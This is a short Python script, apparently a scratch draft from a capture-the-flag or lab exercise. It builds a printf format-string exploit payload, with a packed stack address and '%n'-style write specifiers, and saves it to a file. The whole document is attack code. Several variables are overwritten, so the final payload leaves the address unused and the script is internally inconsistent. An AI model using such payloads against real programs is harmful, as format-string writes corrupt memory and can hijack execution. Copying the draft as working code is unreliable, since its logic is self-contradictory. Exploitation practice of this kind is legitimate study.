# 0x00007fffffffdd20

ret = "\x20\xdd\xff\xff\xff\x7f\x00\x00"
form = "%4x%6$hn"
form = "%7$hn"
pay = "1\n" + ret + form
pay = "1\n" + form + "\n"
print(len(pay))

with open('pay', "wb") as f:
    f.write(pay.encode())
